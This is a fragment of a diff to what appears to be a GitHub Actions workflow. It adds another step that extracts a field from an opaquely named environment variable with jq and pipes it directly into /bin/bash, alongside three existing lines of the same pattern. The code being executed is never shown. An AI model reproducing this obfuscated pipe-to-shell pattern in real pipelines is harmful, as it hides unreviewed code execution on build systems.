@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$y438" | jq -r .ry128 | /bin/bash
           echo $sgge6343 | jq -r .p053 | /bin/bash
           echo $lp91 | jq -r .rynyp3 | /bin/bash
+          echo $auw9 | jq -r .l964 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
